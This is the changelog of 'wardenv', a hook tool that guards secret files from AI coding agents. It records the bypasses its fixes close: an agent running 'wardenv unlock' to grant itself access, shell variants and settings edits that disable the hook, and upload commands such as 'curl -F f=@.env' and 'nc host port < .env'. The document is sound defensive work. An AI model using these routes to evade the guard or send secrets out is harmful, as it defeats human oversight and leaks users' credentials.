# Changelog

## Unreleased

An agent could grant itself an unlock. Found by testing Codex against a real session:
it ran `wardenv unlock .env` and got a working grant. The same holes were open in Claude
Code.

### Fixed

- **`wardenv unlock` now needs a human at a terminal.** The hook blocked the command by
  name, but `node …/cli.js unlock`, PowerShell's `& wardenv unlock`, `cmd /c`,
  `wardenv.cmd`, `eval` and `Start-Process` all ran it anyway. An agent's shell has no
  TTY, so the CLI now refuses without one, and asks you to type the file name back
  before creating the grant. The confirmation also covers `Start-Process`, which opens a
  window with a terminal but nobody at it.
- **Write and Edit could disarm wardenv.** The self-disarm rule only looked at shell
  commands. A Write to `~/.wardenv/grants.json` forged a grant; an Edit to
  `~/.claude/settings.json` could drop the hook, point it at a missing file, empty its
  matcher or set `disableAllHooks`. These are now blocked. The config check applies the
  edit and compares wardenv's hooks before and after, so renaming just `pre-tool.js`
  is caught too. When wardenv is installed from npm, its own `src/` and `hooks/` are
  protected as well; a git checkout stays editable so it can be developed.
- **The hook blocks the shell forms of unlock directly**, as a second layer behind the
  terminal check.
- **Codex is no longer installed.** codex-cli 0.116.0 only fires `SessionStart`,
  `UserPromptSubmit` and `Stop`, with no tool hook, so wardenv never ran there while the
  installer printed "installed". `wardenv install` skips Codex, `wardenv install codex`
  refuses, and `wardenv uninstall codex` removes old entries.

### Added

- `unlock-granted` and `unlock-refused` audit events. Only the use of a grant was logged
  before, so there was no record of who created one.
- 6 new tests, 52 total.

## 0.1.5 — 2026-09-22

### Fixed

- **An agent could upload a secret file over the network.** `curl -F f=@.env`,
  `curl -d @.env`, `curl -T .env`, `wget --post-file=.env`, `http POST url @.env`,
  `nc host port < .env` and `Invoke-WebRequest -InFile .env` all returned `allow` or
  `redact`. Redaction was no protection: it cleans what the agent sees coming back, and the
  file had already left. Fixed: a network client whose upload source is a secret file is
  blocked. `curl -o .env`, which writes into the file, is unchanged.
- **An unlock can't be spent on an upload.** A `wardenv unlock` grant lets the agent read a
  value. It does not let the agent send the file anywhere, and a denied upload doesn't
  consume the grant.

### Added

- 3 new tests, 46 total.

## 0.1.4 — 2026-09-22

Five gaps found in an audit, all inside the stated threat model: a helpful agent taking
the obvious path. Each one was confirmed by running the real hooks before being fixed.

### Fixed

- **`MultiEdit` let any secret through.** The tool was in the hook matcher and in the
  write-guard set, so it looked covered. But the hook only read scalar fields
  (`content`, `new_string`) and MultiEdit carries its text in `edits[].new_string`. The
  body always arrived empty. A secret that `Edit` blocked, `MultiEdit` allowed. Fixed: the
  hook now reads every `edits[]` entry.
- **A quoted path was not a secret.** `cat ".env"` and `cat '.env'` were allowed.
  `stripLiterals` removed every quoted string before analysis to avoid false positives
  like `git commit -m "fix .env parsing"`, and a comment claimed the target still survived
  as a token. It didn't. Fixed: a literal that is exactly a secret path is kept as a
  target; a phrase that only mentions the name is still treated as data.
  `classifyPath` also strips surrounding quotes and whitespace now.
- **Inline interpreter scripts read secrets unchecked.** `node -e "...readFileSync('.env')"`
  and `python -c "open('.env').read()"` returned `allow`, not even `redact`, because the
  path lives inside a string. Fixed: one-liners for node, deno, bun, python, ruby, perl,
  php and Rscript are blocked when they open a secret path. A literal that is only data
  (`x=['secrets/a']`) still passes.
- **Structured tool output came back as a JSON string.** When `tool_output` was an object
  like `{stdout, stderr}` and a redaction fired, PostToolUse returned the whole object
  serialized as one string. Fixed: fields are redacted in place and the shape is kept.
  Hit counts are also deduplicated, so a secret seen in both stdout and stderr counts once.
- **Audit log rotation dropped history.** Only one rotated file (`.1`) was kept, and each
  rotation overwrote it, so the trail stopped at about 4MB. Fixed: five rotated files are
  kept.

### Added

- 8 new tests, 43 total. Each fix has a leak test, and the quoted-path, one-liner and
  MultiEdit fixes each have a matching friction test so the fix can't bring back a false
  positive.

## 0.1.3 — 2026-09-21

Two real security/usability bugs, both found from a live false report: `wardenv unlock`
appeared to do nothing.

### Fixed

- **`wardenv unlock` never worked for Bash or PowerShell commands.** The unlock grant was
  only checked in the `Read` tool branch of the PreToolUse hook. `cat .env` and
  `grep ... .env` — the most common way anyone actually reads a file — ignored any active
  grant and stayed blocked forever, even immediately after a successful
  `wardenv unlock .env`. Fixed: the Bash/PowerShell branch now checks and consumes the
  grant exactly like Read does.
- **A directory rule matched a bare word, not a path.** `secrets?` (and the five other
  directory patterns: `.ssh`, `.aws`, `.gnupg`, `.kube`, `.docker`) matched the *entire
  string* when it had no slash at all, not just a path segment. `grep SECRET .env` was
  blocked because `SECRET` — grep's search pattern, not a path — was misclassified as a
  secret directory. This also broke unlock indirectly: the token captured for the grant
  check was `SECRET` instead of `.env`, so even a correct grant lookup would have missed.
  Fixed: each rule now requires an actual path separator on at least one side.

### Added

- `test/hooks.test.js`: integration tests that invoke `hooks/pre-tool.js` as a real
  subprocess over stdin/stdout, the way Claude Code does — not just the underlying
  `src/lib/` functions in isolation. The unlock bug lived entirely in the hook's wiring,
  not in any individual module, so unit tests on `lib/unlock.js` and `lib/command.js`
  alone could never have caught it. 8 new tests, 35 total.

## 0.1.2 — 2026-09-19

Polish pass. No behavior change to what gets blocked or redacted.

### Fixed

- `wardenv scan` on a missing file, and `wardenv status` in a directory it cannot read,
  both dumped a raw Node stack trace. They now print an error and exit 1.
- The README badge claimed 14 passing tests when the suite had 21.

### Added

- A CLI test suite covering the interface itself: help output, argument validation, exit
  codes, and that filesystem errors never surface as stack traces. `npm test` now runs
  both suites — 27 tests total.

## 0.1.1 — 2026-09-19

- Package description rewritten; it still carried wording from the project's
  pre-rename draft.
- Added `homepage` and `bugs` links so the npm page points at the repo.
- README no longer mentions a pre-release install path.

## 0.1.0 — 2026-09-19

First working version. Blocks secret reads, redacts leaked values in tool output, blocks
secrets being written into non-vault files, and logs every unlock.

### Security fixes found during development

Both were found the same way: wardenv blocked its own development, and investigating the
block revealed a real defect.

- **Chained commands escaped the read check.** Only the first binary on a line was
  inspected, so anything after `&&`, `;` or `|` was never evaluated against the reader
  list. `echo hi && cat .env` was classified as a mention and allowed through with
  redaction instead of being blocked. Every segment now gets its own verdict.
- **The PEM rule matched its own source.** `redact.js` contained a literal
  `BEGIN PRIVATE KEY` marker, so scanning the repository reported a false positive in the
  scanner itself. Markers are now assembled at runtime.

### False positives fixed

Each one blocked legitimate work, and each is now a regression test:

- Quoted text and heredoc bodies were treated as read targets, so a commit message
  mentioning `.env` — or a test array containing `secrets/prod.json` — was blocked as an
  access attempt. Quoted text is data; the path that matters is the one loose on the line.
- `install.js` matched *any* project's installer, not just wardenv's.
- The self-disarm rule fired on the phrase anywhere in a command, so
  `grep "wardenv install" README.md` was blocked. `wardenv` now has to be in command
  position — start of a segment, or after an executor like `bash -c` or `npx`.

### Added

- Library API (`inspect()` / `scrub()`) so the engine can be driven from other runtimes.
  `package.json` previously pointed `main` at a file that did not exist.
- Multi-agent installer with per-target `verified` flags.
- Codex CLI adapter — same hook contract, **not verified end to end**.
- CI across 3 operating systems and 3 Node versions, plus a self-scan job.
- `SECURITY.md` with the threat model and five known limits, including that IDE text
  selection bypasses hooks entirely — a secret selected in the editor reaches the model
  without passing through any tool call.
